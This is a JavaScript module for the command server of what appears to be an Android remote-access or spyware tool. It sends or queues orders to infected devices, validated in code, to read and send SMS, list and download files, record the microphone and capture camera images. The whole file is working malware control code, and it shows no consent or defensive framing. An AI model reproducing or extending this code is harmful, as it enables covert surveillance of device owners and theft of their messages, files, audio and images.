// Command Manager Module
class CommandManager {
    constructor(config, logManager) {
        this.config = config;
        this.logManager = logManager;
    }

    sendCommand(clientManager, clientID, commandID, commandPayload = {}, cb = () => { }) {
        this.checkCorrectParams(commandID, commandPayload, (error) => {
            if (!error) {
                let client = clientManager.db.maindb.get('clients').find({ clientID }).value();
                if (client !== undefined) {
                    commandPayload.type = commandID;
                    if (clientID in clientManager.clientConnections) {
                        let socket = clientManager.clientConnections[clientID];
                        this.logManager.log(this.config.logTypes.info, "Requested " + commandID + " From " + clientID);
                        socket.emit('order', commandPayload);
                        return cb(false, 'Requested');
                    } else {
                        this.queCommand(clientManager, clientID, commandPayload, (error) => {
                            if (!error) return cb(false, 'Command queued (device is offline)');
                            else return cb(error, undefined);
                        });
                    }
                } else return cb('Client Doesn\'t exist!', undefined);
            } else return cb(error, undefined);
        });
    }

    queCommand(clientManager, clientID, commandPayload, cb) {
        let clientDB = clientManager.getClientDatabase(clientID);
        let commandQue = clientDB.get('CommandQue');
        let outstandingCommands = [];
        commandQue.value().forEach((command) => {
            outstandingCommands.push(command.type);
        });

        if (outstandingCommands.includes(commandPayload.type)) {
            return cb('A similar command has already been queued');
        } else {
            commandPayload.uid = Math.floor(Math.random() * 10000);
            commandQue.push(commandPayload).write();
            return cb(false);
        }
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        if (commandID === this.config.messageKeys.sms) {
            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') return cb(false);
                else if (commandPayload.action === 'sendSMS') {
                    if (!('to' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else if (!('sms' in commandPayload)) return cb('SMS Missing `sms` Parameter');
                    else return cb(false);
                } else return cb('SMS `action` parameter incorrect');
            }
        }
        else if (commandID === this.config.messageKeys.files) {
            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter');
                    else return cb(false);
                }
                else if (commandPayload.action === 'dl') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter');
                    else return cb(false);
                }
                else return cb('Files `action` parameter incorrect');
            }
        }
        else if (commandID === this.config.messageKeys.mic) {
            if (!('sec' in commandPayload)) return cb('Mic Missing `sec` Parameter');
            else cb(false);
        }
        else if (commandID === this.config.messageKeys.camera) {
            if (!('action' in commandPayload)) return cb('Camera Missing `action` Parameter');
            else {
                if (commandPayload.action === 'list') return cb(false);
                else if (commandPayload.action === 'capture') {
                    if (!('id' in commandPayload)) return cb('Camera Missing `id` Parameter');
                    else return cb(false);
                } else return cb('Camera `action` parameter incorrect');
            }
        }
        else if (commandID === this.config.messageKeys.gotPermission) {
            if (!('permission' in commandPayload)) return cb('GotPerm Missing `permission` Parameter');
            else cb(false);
        }
        else if (Object.values(this.config.messageKeys).indexOf(commandID) >= 0) return cb(false);
        else return cb('Command ID Not Found');
    }
}

module.exports = CommandManager;
